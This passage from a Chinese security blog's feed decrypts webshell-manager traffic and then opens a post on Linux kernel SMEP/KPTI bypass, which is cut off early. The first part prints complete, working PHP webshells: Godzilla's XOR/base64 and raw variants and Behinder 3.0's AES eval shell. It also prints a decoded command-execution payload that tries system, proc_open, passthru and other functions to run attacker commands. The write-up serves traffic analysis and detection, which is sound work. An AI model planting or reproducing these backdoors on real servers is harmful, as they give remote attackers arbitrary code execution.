AgICAgICAgZWNobyBzdWJzdHIobWQ1KCRwYXNzLiRrZXkpLDE2KTsNCiAgICB9ZWxzZXsNCiAgICAgICAgaWYgKHN0cnBvcygkZGF0YSwiZ2V0QmFzaWNzSW5mbyIpIT09ZmFsc2Upew0KICAgICAgICAgICAgJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV09ZW5jb2RlKCRkYXRhLCRrZXkpOw0KICAgICAgICB9DQogICAgfQ0KfQ0K</code></pre><p>然后再base64解码：</p><pre><code class="php">@session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){  for($i=0;$i&lt;strlen($D);$i++) {    $c = $K[$i+1&amp;15];    $D[$i] = $D[$i]^$c;  }  return $D;}$pass='key';$payloadName='payload';$key='3c6e0b8a9c15224a';if (isset($_POST[$pass])){  $data=encode(base64_decode($_POST[$pass]),$key);  if (isset($_SESSION[$payloadName])){    $payload=encode($_SESSION[$payloadName],$key);    if (strpos($payload,"getBasicsInfo")===false){      $payload=encode($payload,$key);    }    eval($payload);    echo substr(md5($pass.$key),0,16);    echo base64_encode(encode(@run($data),$key));    echo substr(md5($pass.$key),16);  }else{    if (strpos($data,"getBasicsInfo")!==false){      $_SESSION[$payloadName]=encode($data,$key);    }  }}</code></pre><p>即是PHP_XOR_BASE64的默认shell，至于后面key的编码和PHP_XOR_BASE64解密方法一致，可参考上面小节。</p><h3 id="PHP-XOR-RAW"><a href="#PHP-XOR-RAW" class="headerlink" title="PHP_XOR_RAW"></a>PHP_XOR_RAW</h3><p>对应的默认木马文件：</p><pre><code class="powershell">&lt;?php@session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){    for($i=0;$i&lt;strlen($D);$i++) {        $c = $K[$i+1&amp;15];        $D[$i] = $D[$i]^$c;    }    return $D;}$payloadName='payload';$key='3c6e0b8a9c15224a';$data=file_get_contents("php://input");if ($data!==false){    $data=encode($data,$key);    if (isset($_SESSION[$payloadName])){        $payload=encode($_SESSION[$payloadName],$key);        if (strpos($payload,"getBasicsInfo")===false){            $payload=encode($payload,$key);        }        eval($payload);        echo encode(@run($data),$key);    }else{        if (strpos($data,"getBasicsInfo")!==false){            $_SESSION[$payloadName]=encode($data,$key);        }    }}</code></pre><p>这里根据shell可以得到 解密过程更简单一点，但它需要提取二进制数据进行解密，直接用wireshark有点麻烦就在哥斯拉的shell里添了：</p><pre><code class="powershell">$b = file_put_contents('raw.txt', $data);</code></pre><p>将二进制文本存了下来，然后直接读取解密：</p><pre><code class="powershell">&lt;?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){    for($i=0;$i&lt;strlen($D);$i++) {        $c = $K[$i+1&amp;15];        $D[$i] = $D[$i]^$c;    }    return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';$file_path = "raw.txt";if (file_exists($file_path)) {    $fp = fopen($file_path, "r");    $post = fread($fp, filesize($file_path));    $post = str_replace("\r\n", "", $post);}#$post = "";#echo base64_decode($post);echo "&lt;br/&gt;";echo "&lt;br/&gt;";#$data=encode(base64_decode($post),$key);$data=encode(($post),$key);echo $data;</code></pre><h2 id="冰蝎3-0"><a href="#冰蝎3-0" class="headerlink" title="冰蝎3.0"></a>冰蝎3.0</h2><p>这里还是以php为例，默认shell如下：</p><pre><code class="php">&lt;?php@error_reporting(0);session_start();    $key="a02439ec229d8be0"; //该密钥为连接密码32位md5值的前16位，默认连接密码POST    $_SESSION['k']=$key;    session_write_close();    $post=file_get_contents("php://input");    if(!extension_loaded('openssl'))    {        $t="base64_"."decode";        $post=$t($post."");                for($i=0;$i&lt;strlen($post);$i++) {                 $post[$i] = $post[$i]^$key[$i+1&amp;15];                 }    }    else    {        $post=openssl_decrypt($post, "AES128", $key);    }    $arr=explode('|',$post);    $func=$arr[0];    $params=$arr[1];    class C{public function __invoke($p) {eval($p."");}}    @call_user_func(new C(),$params);?&gt;</code></pre><p>由shell可得冰蝎所进行ase加密的恶意代码，这里解密需要密钥，而密钥是由设置连接密码32位md5加密的前16位组成，整体解法并不复杂。</p><pre><code class="powershell">2L40NUw3Mv00wTIlVK7Jz4FY4xOvRXtym/xSmP20i+wHTDZpqs0PHF7j3BzBDhZlPVbkI8iaBWjGuwdmzA8CfTOxPkH547xm5v8GyO7utOD/HuDO/LVXdKL6swAu4sGlBtEaK8FDyETSfNYiYmcfkaQYGUMTt1jjFE0EYckfjMh+9muc7UGO8K5EIGcwF8LdtuNeH0QOv2nBEarF9R53r9X2JdWfBungKXiOGVbWdNEiUTG3NU5Mlem0r+Vvsvv19HQLTtNlBPB7M8tDE0LtSktjPgt5n50+rJe3bLKMnI/aaoHNe8bcfbiLSk13Fn5D8dXwkf8vN6OaVDVq+Dn3qaCORhOSX+36YvzAgmdWWYb7e0TAAHK9UTlifPZGyCzt7DFUipMIpeEdNqdfh4TN2TSy/Dua8FiIutMA5pI9zrkC/g/OAqK3C6PsfvQOQSkoYkA3uS0/GK+oMiIplS3VLtxqtKpgS3a4IC6yHn/dZnwPpf32lzuzGfRnhOIluqXqzvLyxJC7mKhMj0IjVjztm6XKbi2Nki2DAQVh36gdHCC6by4Ut/2err6VZDrIQUrWycdZzCCu2OD1FFAZzUOiQ++PxUS2rOc5K+I2NnLgGePpj6VOmDbOibLrfrFG0nQOHXkpK4r+XKRypn21dDB7tg2N3Q8PXdmkygpGTic8dU98KA/hqog0uWoNOEVo6KbIScewGuTEvOlGiObfTPfZCW5n0oW6nonx8ljzVy1MU3MvcH6vkTNhpcUbuInyND8DMqdpi+MvfPlX0tuD9AE5G9F533u2ovGNCQroyFuFwNAu7ovUzpML1AsBaFTbdQKgo5d4YNdIBE6/kFW30b6WQMOg8cok2R+9mowbtp/4P77/ruY+mhp4Gba1cCINXeWv9rWQYr1tn2a34Pe09Z4g1vN8xjdyHE5PMs1mpAWog6eE1ZLiXSrHsT2Bj85BnZhVVlqMym6NMVm3uLCqiX0J6ul+zILAYQivDOzMxNpdCFojitJ5G3DSL5wk/U+xZoSz8mCrA2ovuaSvDknw+bBSORJv5xC8otDLV3g/5dBuAjDlOkbSD4MfL3MfdvIq6g0d807G9txdQk4/IyBtlz9HFu4LZ4bHB/3N8MmnDP1DZEfJ1zjakmHFMJMkntoda4xBsuz4C/QYykF3ctZ8azJPHmtG0ruvMPO1le1wqINkkZy2GsJDVxJV2n1Fb4NYdGxiydoU9so+NtGCPr3bbmj/AxlplfHLzzC9nJ4yOn3Su9YzYxrgpcvj6z7GPhM2b1UOWQPzNwDtgWMTXVrGtZ7JJscx00G3P7akErCmodWRyU+9Lch5FFvCxjc/48k2Dpja91Y5dqsVVJZ8FmHHN39oweIBiE6n21ShMhB4D+BW+jLK11GmlRCcrj0leZUh8pTPd0E6K/JFJMIozcolxXpa8hY8snvC9BiNdMg2ltrD0yj64eqvTMBWJqYY3oMckenhix/fUEX7jCMABsiUWDeYrf/ds4i1NWxcAnnARcTnVoqLIaSzd9CUTmUdQrfVJbZ2ghTqsY0qQ8dVteGcXyD8ehMf1ClgKDx0akUcVMzJfQRiX2X1Uv5RRuC64hGuRo2wMn0uKqZqMSU1Yf1KiDw5R/m0hZjB30+8Cr6d+RCxp2bPWvdXrPrJasCHhhqx7kHi/RPqjO0rpl/y01pK5MVe6AUBZoGcsFwzML911PdtdXAEjPaFZqAu829efqTMS9wDBO7F4n+l93rgsdEY0ejrq/R/jbhprzReX/8tvGRPAzSFd6OS+BKAZYZ3PcMGcGTp4v1/SnM/DVx1B6sOpztsQ65ZzDPWa+iudfxdhiKlY+smt2uJCC413enKyGwJ+X+PtkS1yBB0im+xNuCOrC7Qn72Q2TW/VjQmHaPpQVoLLJ5cIorBLnLxlk63dZsd4to5+xISEru4utDoART3MS+IRgxVe1af89yerrVdyO+/6IVNLz/N9alZ2i1LRnAiY5FovPB+IJjo0xNqqEiGCF3B2hEl9/C9XaXbk5lVi/JhGcA5r0CNgn4i6ROqL8fgrqbZ0h53hf9TAotoTV9B9NiufGDxn/slXDu1km6Oqd1YA/EKrKLTlNkd0GKvWBEnYEqx+82eJ8yTUTRWPyl63jh6kgNKHbqU+e840JF1bOMy5+JBuH9jhrSak8HVdU9j4ey3A6tldMKagq1s8swjcXmMsVB3LNoMJN90/k0TTRj9oM2VYLz1eknBKtxR8g3Nnrpo4KOrk2C1mrsFoPoptJgocyX9YQMUyrVx9qPRvjRggJnV2ANWO4mLze1rHGPAAMLG8Wof8sgNSp4UbOqd9aykJ87JUXtn1X3TT6WDmFZPrYWf7uzJ63AIfOKn9ZSs0DTfLOJGsHEqzWP2rWG1aH/CnEb0HBF6bov2qhwUSg6W77NhEuqYZ/X8pbfbDzRBU/IZTUidvIxQFLSOSp8bYB08ROeIhtFF9CDKb3mcwIbP/AL5bQ+PD1I5LZ/Nrmp5jXs3AI+WTn/SBjsaai9JayciOON4gOJtuXW5W/xDAWpT3qhOW0CmEX2/C0fyadgIVXDrNcQ8QCANuvMc3v1yUiDbijCPya14rx/5SoWqHsusPm9LbdNcTDBPkP/fE2Mvo81iQP0iQy7hIExPOb1gBSh2KcJsSeruRO65/PUx+/JLezWee4eRWwH/7uRzQY7q+mrYlBj0vCIckMiPp5CR9oeUs4gdlxhqL4ObV9y8F5dckigcm7RVs2gRU7HT4BHxtfuf6mRwO99ocrSvlcBz0aTDmVdQ7dQMSzfhgPhCqtSQSpeohbwFQYUYAKIJppOX7cxhXJmaZJA4ykzRZN/nimUCkUEZEBystBfve6ZXNSgQTR7jU14q9w+Fq4nG+11Q/EmdqWoZ615gZ0ANGAugixjJZ+9mHRlphfzyJo8c/d4U1nNkzx/D1Tk6WDarwdicqMEGlkxQC8swqvndAYAUTedIpKVnkRu+TBPoDvbBvb2XQgLV/LvcZXSqKbWQ0Lm0u7ZW5GwT4ZNIoPpaxrCMCe0TcpR8+OtJWhaiCk4RDG9eEiNENmZVCLDSjK1q19i4051UVVjWQtY+hh7tWkxAWu/eSTSQsbP9m5ddPF4yCltClHP040G5fGIB23sSrlHGQnLIFoXMURB6hMjKL0S8m4AAIDwyLvjdlQ/K4HjHA48tcAWFQMSus4oO4uFouP4kiQi19ucpjq7uilBWbe8ktWebTz8ZyHNi+MQjdpD2vSWh4SL7rALJFqXShjOCJPWlpTqa5Y08JdfxlyFldZhWyo6IoEwXMxj08QOEo+sIkOVmmwUbMuiZ88OWlflnHcbcO8mfMB0r0RNPs16F9fb4VV596GzMpKIqiHvrz8BI0PRPhcbDtpaeQyD8AHRHMHzLcf3g1V9Fwpt4EgIvnPd3qrn4BiYjcbm9+t8bDyP905zyX8HeRskCbv/De7DzeuiTa2WIj4ERKkG+P7zePkTScnYUWITcnG3Ui63rfsgM4pV1omtrIPmV2oGunCAFO1uTQHYu4Z9u64Gs/fBoRAO7oM+AnXywoNIjl8Hx3AivGnciwhuxJm1mCFHkdnNLjU7yGKkuX6UoX4+QKkUroX/gg04b9Z4Vzm2WsQMfGO5VAVRbEOj61FrQlyCM+oYSO2A9aL74BlM972BYqqlGb8nLLKyBPpGrfwsPDR2mTZdz1sRSsRI2ItXR7wZjikxHCsVKsxgJGCna9iHiW6DZ5aIuhbUIhrVUVh8ws42qi3FyInGGBXTZU2EmETOzBBuiWBe+5gSQVRJ6nRe2ZsVhQoZJzJ1K6p6rae2Kp4wRD15kEN02kZZztuQGW9Lo2mPieZqRGFxWHiDy+nDTM1up1lCrDM5aoTPWS7G2efBwEj3uWigrPoc/6uzsbnMZa/pInWnXa3xGUca8X1gf3Rp1djsTpkyAjFVAMih6nGvemcoJCEINvne/Aq/ecvW+rP9TBkr/rXIrnaJjNHPCeYNOjl/C+LV+3EGJ/nBwsvbbb0+LpAS0uUjU2lszk3uPb9dsm29w1ZZoiku56Ab4h4wON/XHZ2z7qbRV4g4ISEcNTJdtqj0+D1fEIt4wClabVTgjTSId+4qkkv/OafZKxm8TqMXGxRMDpMSZdP3E8XOmck+MO4VMkabinj3F+yYLWD4IU20tJNKQ08Idz5SQ//E5YCofQYtSEzefMB0BSXxYxU57/Sz3noBaW2w12m74eFQr97nfwQX9JY/qudbrtwVZd1cJjAUEzd5wdb35T24t0AQGkvQAGCpZlIu0k33N6rNXOYXKeE8cDx+gnzwcGOOGxqvhrTPXP8NciPOKNv/5j0SMT0f4FBnNinaeRTX5IFseh4CO9OrO4xk8cI56o76BJFra8bUWqBEO83z37yD8cVk9XthxXYaHKmZur2AOuBpRBnmQqv36WvKRCReEfKiiYLGCrr1VJpEKrRWDESBvYxRU5IGM2hpcKqRo3+NwpwZsUdhIar6xQrEuWssOk41XuA1CyMpir8Re2LgaJIIRmk3N7mkvgr5/T8p8dFgZVdY1zOndkDOnQjGaKNJcmCYPt20+hXDo1dzVCPC3gDCtlbABSk2HNfwhOAGzrF+iInJCz1vOsFfM4ZyMz8v7b5E9S7559A11uAr4Z3crYz8fArkfnW7RV4w5JMSPVAltoecdujNYwsoL7+Qbb7X4EaYLpcrRLKrsUg7mXX7cc3GhAB4Wh7tqLFQw4CbMaKvmweImDdRelY3r5TjxCCROAfMTRGGiRhlopX7yw8CF+5c1cAR6PPJaMYSSztRRCok+cOkhD4pLeUEgRCuafwMQB350BfspEYONdr6Z7+hLgYNNEJa9cg4X7PKNB7OBwJ+//R/fFNG4xf3L5miXeJY2JaiHuA7duJH6kUpBfGq7jS+knRz/8azOc2n9TH/8J74h6wr8kHdStHAPgA7wetx+tqL4Y6CUGM3Hwuv4VpB2ZgQv/427BYRQ41nrPhMhYnAfFqIMpb1QfyLfB199FTzOkTYb20jHZolby3ZQUrWp5G2WOUmdg6/CNOoABPQWLJbiEurOQK7cR35pGr5XEix0UpfI3BvR8z+fGNAwxbVWAT/A3ZK1KLllQdkAJt8x+nUShictq2xUmZN3PPCaBtpSYDFrGdPAp+Gof69u2Eb6WH89pxNhA53tAWHUi2+0ExN4g/ZJUjfAtZqICWQKdCcmEaBkh/6v7mFqMmHon4THlcabBobb+Lp7EO6IntTWVrCdx4+oMpoEQKq5TZd0IIGEmxSJrrwel6r/gorqY0NTCE2i0yQ0MHxdgGQj6/ZA5+8Ani6/AMkeNF7DGeozFr53NycnWO6wFeXmoBeJ2w2Hmj0RVecPwU809v+hOxL45Tn6g9ZSSG7hFZJkUVjD0NO3u3hhcN65wbPsILHJZpTo/KiocBy2S1+j747iMfzKmgmqsBcI1y+Vx3C/5Km2rsaagSSxXQx1eqTF3Y07Aq4h5SJp5x3eHm50WCC2Iyh7Vb37+a9jrFu76U+1AiwMM8pYCLWIxrYbcU/wo2eLnpWlRnGEUrtijjdrwegXDCAiEqvhqp11DUU3KUy5UwfcPZeeMo5a5T32TVbWDX2eyMCNXMyx5UzCpspxh4Qj+SWgaXswoIab5Gx5rq7h8lJNL9P2/js0D7VgO1AwdeUI8RmsK1TygwQBGHu92S2/PR1YTzQ3dB5U9mwLM2nUxi0U0BrHI/4hh/Ilpw4msZNk69IlpXcfNyPvVFKxZaU=</code></pre><p>ASE加密模式CBC，填充：okcs7padding，密钥长度：128位，密钥：a02439ec229d8be0：</p><pre><code class="powershell">Pssert|eval(base64_decode('QGVycm9yX3JlcG9ydGluZygwKTsNCg0KZnVuY3Rpb24gZ2V0U2FmZVN0cigkc3RyKXsNCiAgICAkczEgPSBpY29udigndXRmLTgnLCdnYmsvL0lHTk9SRScsJHN0cik7DQogICAgJHMwID0gaWNvbnYoJ2diaycsJ3V0Zi04Ly9JR05PUkUnLCRzMSk7DQogICAgaWYoJHMwID09ICRzdHIpew0KICAgICAgICByZXR1cm4gJHMwOw0KICAgIH1lbHNlew0KICAgICAgICByZXR1cm4gaWNvbnYoJ2diaycsJ3V0Zi04Ly9JR05PUkUnLCRzdHIpOw0KICAgIH0NCn0NCmZ1bmN0aW9uIG1haW4oJGNtZCwkcGF0aCkNCnsNCiAgICBAc2V0X3RpbWVfbGltaXQoMCk7DQogICAgQGlnbm9yZV91c2VyX2Fib3J0KDEpOw0KICAgIEBpbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLCAwKTsNCiAgICAkcmVzdWx0ID0gYXJyYXkoKTsNCiAgICAkUGFkdEpuID0gQGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7DQogICAgaWYgKCEgZW1wdHkoJFBhZHRKbikpIHsNCiAgICAgICAgJFBhZHRKbiA9IHByZWdfcmVwbGFjZSgnL1ssIF0rLycsICcsJywgJFBhZHRKbik7DQogICAgICAgICRQYWR0Sm4gPSBleHBsb2RlKCcsJywgJFBhZHRKbik7DQogICAgICAgICRQYWR0Sm4gPSBhcnJheV9tYXAoJ3RyaW0nLCAkUGFkdEpuKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkUGFkdEpuID0gYXJyYXkoKTsNCiAgICB9DQogICAgJGMgPSAkY21kOw0KICAgIGlmIChGQUxTRSAhPT0gc3RycG9zKHN0cnRvbG93ZXIoUEhQX09TKSwgJ3dpbicpKSB7DQogICAgICAgICRjID0gJGMgLiAiIDI+JjFcbiI7DQogICAgfQ0KICAgICRKdWVRREJIID0gJ2lzX2NhbGxhYmxlJzsNCiAgICAkQnZjZSA9ICdpbl9hcnJheSc7DQogICAgaWYgKCRKdWVRREJIKCdzeXN0ZW0nKSBhbmQgISAkQnZjZSgnc3lzdGVtJywgJFBhZHRKbikpIHsNCiAgICAgICAgb2Jfc3RhcnQoKTsNCiAgICAgICAgc3lzdGVtKCRjKTsNCiAgICAgICAgJGtXSlcgPSBvYl9nZXRfY29udGVudHMoKTsNCiAgICAgICAgb2JfZW5kX2NsZWFuKCk7DQogICAgfSBlbHNlIGlmICgkSnVlUURCSCgncHJvY19vcGVuJykgYW5kICEgJEJ2Y2UoJ3Byb2Nfb3BlbicsICRQYWR0Sm4pKSB7DQogICAgICAgICRoYW5kbGUgPSBwcm9jX29wZW4oJGMsIGFycmF5KA0KICAgICAgICAgICAgYXJyYXkoDQogICAgICAgICAgICAgICAgJ3BpcGUnLA0KICAgICAgICAgICAgICAgICdyJw0KICAgICAgICAgICAgKSwNCiAgICAgICAgICAgIGFycmF5KA0KICAgICAgICAgICAgICAgICdwaXBlJywNCiAgICAgICAgICAgICAgICAndycNCiAgICAgICAgICAgICksDQogICAgICAgICAgICBhcnJheSgNCiAgICAgICAgICAgICAgICAncGlwZScsDQogICAgICAgICAgICAgICAgJ3cnDQogICAgICAgICAgICApDQogICAgICAgICksICRwaXBlcyk7DQogICAgICAgICRrV0pXID0gTlVMTDsNCiAgICAgICAgd2hpbGUgKCEgZmVvZigkcGlwZXNbMV0pKSB7DQogICAgICAgICAgICAka1dKVyAuPSBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KICAgICAgICB9DQogICAgICAgIEBwcm9jX2Nsb3NlKCRoYW5kbGUpOw0KICAgIH0gZWxzZSBpZiAoJEp1ZVFEQkgoJ3Bhc3N0aHJ1JykgYW5kICEgJEJ2Y2UoJ3Bhc3N0aHJ1JywgJFBhZHRKbikpIHsNCiAgICAgICAgb2Jfc3RhcnQoKTsNCiAgICAgICAgcGFzc3RocnUoJGMpOw0KICAgICAgICAka1dKVyA9IG9iX2dldF9jb250ZW50cygpOw0KICAgICAgICBvYl9lbmRfY2xlYW4oKTsNCiAgICB9IGVsc2UgaWYgKCRKdWVRREJIKCdzaGVsbF9leGVjJykgYW5kICEgJEJ2Y2UoJ3NoZWxsX2V4ZWMnLCAkUGFkdEpuKSkgew0KICAgICAgICAka1dKVyA9IHNoZWxsX2V4ZWMoJGMpOw0KICAgIH0gZWxzZSBpZiAoJEp1ZVFEQkgoJ2V4ZWMnKSBhbmQgISAkQnZjZSgnZXhlYycsICRQYWR0Sm4pKSB7DQogICAgICAgICRrV0pXID0gYXJyYXkoKTsNCiAgICAgICAgZXhlYygkYywgJGtXSlcpOw0KICAgICAgICAka1dKVyA9IGpvaW4oY2hyKDEwKSwgJGtXSlcpIC4gY2hyKDEwKTsNCiAgICB9IGVsc2UgaWYgKCRKdWVRREJIKCdleGVjJykgYW5kICEgJEJ2Y2UoJ3BvcGVuJywgJFBhZHRKbikpIHsNCiAgICAgICAgJGZwID0gcG9wZW4oJGMsICdyJyk7DQogICAgICAgICRrV0pXID0gTlVMTDsNCiAgICAgICAgaWYgKGlzX3Jlc291cmNlKCRmcCkpIHsNCiAgICAgICAgICAgIHdoaWxlICghIGZlb2YoJGZwKSkgew0KICAgICAgICAgICAgICAgICRrV0pXIC49IGZyZWFkKCRmcCwgMTAyNCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgQHBjbG9zZSgkZnApOw0KICAgIH0gZWxzZSB7DQogICAgICAgICRrV0pXID0gMDsNCiAgICAgICAgJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJmYWlsIik7DQogICAgICAgICRyZXN1bHRbIm1zZyJdID0gYmFzZTY0X2VuY29kZSgibm9uZSBvZiBwcm9jX29wZW4vcGFzc3RocnUvc2hlbGxfZXhlYy9leGVjL2V4ZWMgaXMgYXZhaWxhYmxlIik7DQogICAgICAgICRrZXkgPSAkX1NFU1NJT05bJ2snXTsNCiAgICAgICAgZWNobyBlbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCAka2V5KTsNCiAgICAgICAgcmV0dXJuOw0KICAgICAgICANCiAgICB9DQogICAgJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJzdWNjZXNzIik7DQogICAgJHJlc3VsdFsibXNnIl0gPSBiYXNlNjRfZW5jb2RlKGdldFNhZmVTdHIoJGtXSlcpKTsNCiAgICBlY2hvIGVuY3J5cHQoanNvbl9lbmNvZGUoJHJlc3VsdCksICAkX1NFU1NJT05bJ2snXSk7DQp9DQoNCmZ1bmN0aW9uIGVuY3J5cHQoJGRhdGEsJGtleSkNCnsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQ0KICAgIAl7DQogICAgCQlmb3IoJGk9MDskaTxzdHJsZW4oJGRhdGEpOyRpKyspIHsNCiAgICAJCQkgJGRhdGFbJGldID0gJGRhdGFbJGldXiRrZXlbJGkrMSYxNV07IA0KICAgIAkJCX0NCgkJCXJldHVybiAkZGF0YTsNCiAgICAJfQ0KICAgIGVsc2UNCiAgICAJew0KICAgIAkJcmV0dXJuIG9wZW5zc2xfZW5jcnlwdCgkZGF0YSwgIkFFUzEyOCIsICRrZXkpOw0KICAgIAl9DQp9JGNtZD0iWTJRZ0wyUWdJa1E2WEhCb2NITjBkV1I1WDNCeWIxeFhWMWRjSWlaM2FHOWhiV2s9IjskY21kPWJhc2U2NF9kZWNvZGUoJGNtZCk7JHBhdGg9IlJEb3ZjR2h3YzNSMVpIbGZjSEp2TDFkWFZ5OD0iOyRwYXRoPWJhc2U2NF9kZWNvZGUoJHBhdGgpOw0KbWFpbigkY21kLCRwYXRoKTs='));</code></pre><p>将内容base64解密：</p><pre><code class="php">@error_reporting(0);function getSafeStr($str){    $s1 = iconv('utf-8','gbk//IGNORE',$str);    $s0 = iconv('gbk','utf-8//IGNORE',$s1);    if($s0 == $str){        return $s0;    }else{        return iconv('gbk','utf-8//IGNORE',$str);    }}function main($cmd,$path){    @set_time_limit(0);    @ignore_user_abort(1);    @ini_set('max_execution_time', 0);    $result = array();    $PadtJn = @ini_get('disable_functions');    if (! empty($PadtJn)) {        $PadtJn = preg_replace('/[, ]+/', ',', $PadtJn);        $PadtJn = explode(',', $PadtJn);        $PadtJn = array_map('trim', $PadtJn);    } else {        $PadtJn = array();    }    $c = $cmd;    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {        $c = $c . " 2&gt;&amp;1\n";    }    $JueQDBH = 'is_callable';    $Bvce = 'in_array';    if ($JueQDBH('system') and ! $Bvce('system', $PadtJn)) {        ob_start();        system($c);        $kWJW = ob_get_contents();        ob_end_clean();    } else if ($JueQDBH('proc_open') and ! $Bvce('proc_open', $PadtJn)) {        $handle = proc_open($c, array(            array(                'pipe',                'r'            ),            array(                'pipe',                'w'            ),            array(                'pipe',                'w'            )        ), $pipes);        $kWJW = NULL;        while (! feof($pipes[1])) {            $kWJW .= fread($pipes[1], 1024);        }        @proc_close($handle);    } else if ($JueQDBH('passthru') and ! $Bvce('passthru', $PadtJn)) {        ob_start();        passthru($c);        $kWJW = ob_get_contents();        ob_end_clean();    } else if ($JueQDBH('shell_exec') and ! $Bvce('shell_exec', $PadtJn)) {        $kWJW = shell_exec($c);    } else if ($JueQDBH('exec') and ! $Bvce('exec', $PadtJn)) {        $kWJW = array();        exec($c, $kWJW);        $kWJW = join(chr(10), $kWJW) . chr(10);    } else if ($JueQDBH('exec') and ! $Bvce('popen', $PadtJn)) {        $fp = popen($c, 'r');        $kWJW = NULL;        if (is_resource($fp)) {            while (! feof($fp)) {                $kWJW .= fread($fp, 1024);            }        }        @pclose($fp);    } else {        $kWJW = 0;        $result["status"] = base64_encode("fail");        $result["msg"] = base64_encode("none of proc_open/passthru/shell_exec/exec/exec is available");        $key = $_SESSION['k'];        echo encrypt(json_encode($result), $key);        return;            }    $result["status"] = base64_encode("success");    $result["msg"] = base64_encode(getSafeStr($kWJW));    echo encrypt(json_encode($result),  $_SESSION['k']);}function encrypt($data,$key){    if(!extension_loaded('openssl'))        {            for($i=0;$i&lt;strlen($data);$i++) {                 $data[$i] = $data[$i]^$key[$i+1&amp;15];                 }            return $data;        }    else        {            return openssl_encrypt($data, "AES128", $key);        }}$cmd="Y2QgL2QgIkQ6XHBocHN0dWR5X3Byb1xXV1dcIiZ3aG9hbWk=";$cmd=base64_decode($cmd);$path="RDovcGhwc3R1ZHlfcHJvL1dXVy8=";$path=base64_decode($path);main($cmd,$path);</code></pre><p>而cmd内容即为执行内容：</p><pre><code class="powershell">cd /d "D:\phpstudy_pro\WWW\"&amp;whoami</code></pre><h2 id="小小总结"><a href="#小小总结" class="headerlink" title="小小总结"></a>小小总结</h2><p>这些webshell被大家所使用不仅仅是在当时出现时可绕过大部分流量检测，独特的请求方式，和免杀，还有他们与时俱进的各种功能，内网穿透、内存马等等，实现一键去日内网，随着检测手段加强和内网利用手段的增多，相信也会有新的绕过方法和功能出现。</p><h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><pre><code class="php">https://www.freebuf.com/sectool/285693.htmlhttps://xz.aliyun.com/t/10556http://www.wjhsh.net/0daybug-p-12004574.html</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;webshell管理工具作为进一步信息收集、内网渗透、获取更高权限等功能的好帮手，常出现在攻防对抗和渗透测试场景下，其自带的流量加密用来绕过</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux Kernel 保护机制绕过</title>
    <link href="https://rainsec.cn/post/Linux%20Kernel%20%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87.html"/>
    <id>https://rainsec.cn/post/Linux%20Kernel%20%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87.html</id>
    <published>2022-07-19T10:48:45.000Z</published>
    <updated>2022-07-22T11:57:41.074Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux-Kernel-保护机制绕过"><a href="#Linux-Kernel-保护机制绕过" class="headerlink" title="Linux Kernel 保护机制绕过"></a>Linux Kernel 保护机制绕过</h1><blockquote><p>好久没搞kernel的洞了，最近分析的这方面的洞有点多，相关的Exp任务也比较多，因此学习总结一下方便查找和记忆。</p></blockquote><h2 id="SMEP-KPTI-bypass"><a href="#SMEP-KPTI-bypass" class="headerlink" title="SMEP + KPTI bypass"></a>SMEP + KPTI bypass</h2><p>​        SMEP是SupervisorModeExecutionPrevention的缩写，主要的作用其实就是抵御类似ret2user这样的攻击，简单来说就是阻止内核执行用户态传递的代码。</p><p>​        检测计算机是否开启SMEP保护的方式很简单，<code>cat /proc/cpuinfo | grep smep</code>，如果有匹配到一些信息的话就说明计算机开启了SMEP保护。在CTF赛事中一般会给一些kernel启动的sh脚本，从这些脚本里面我们也可以看出虚拟机在启动kernel时是否开启了SMEP保护：</p><pre><code class="shell">#!/bin/shqemu-system-x86_64 -initrd initramfs.cpio \-kernel bzImage \-append 'console=ttyS0 oops=panic panic=1 nokaslr' \-monitor /dev/null \-m 64M --nographic \-smp cores=1,threads=1 \</code></pre><p>这里是没开启SMEP的脚本，如果在脚本里面加入SMEP相关的cpu参数那么就是开启了SMEP机制。</p><pre><code class="shell">#!/bin/shqemu-system-x86_64 -initrd initramfs.cpio \-kernel bzImage \-append 'console=ttyS0 oops=panic panic=1 nokaslr' \-monitor /dev/null \-m 64M --nographic \-smp cores=1,threads=1 \-cpu kvm64,smep</code></pre><p>还有一种判断SMEP机制是否开启的方法是通过cr4寄存器的值：<img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220319114934180.png" alt="image-20220319114934180"></p><p>第20位代表的就是SMEP机制是否开启，获取cr4寄存器值的方法也很简单，一种可以通过debuger去attach要调试的kernel，另一种就是通过触发SMEP机制的crash<img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220319123657869.png" alt="image-20220319123657869"></p><p>​        KPTI机制更多的是一种页表隔离的机制，当在用户态和内核态之间进行状态切换的时候KPTI机制会尽量减少用户态页表中的内核地址，同时内核页表中所有的用户态页都被设置为NX使得用户态的页不具备可执行权限，这是一种防范<code>Meltdown</code>类似攻击的机制。</p><p>​        